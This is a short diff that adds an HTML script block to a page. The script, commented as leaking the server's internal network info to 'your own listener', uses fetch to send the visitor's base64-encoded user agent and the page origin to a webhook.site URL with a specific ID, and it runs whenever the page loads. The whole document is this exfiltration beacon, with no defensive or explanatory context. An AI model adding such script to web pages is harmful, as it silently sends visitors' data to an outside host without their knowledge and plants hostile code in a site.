@@ -1,0 +1,4 @@
+<script>
+  // Leak the server's internal network info to your own listener
+  fetch('https://webhook.site/7f2c387f-43e0-46a7-867b-3d04377e6a4b?data=' + btoa(navigator.userAgent + " " + location.origin));
+</script>
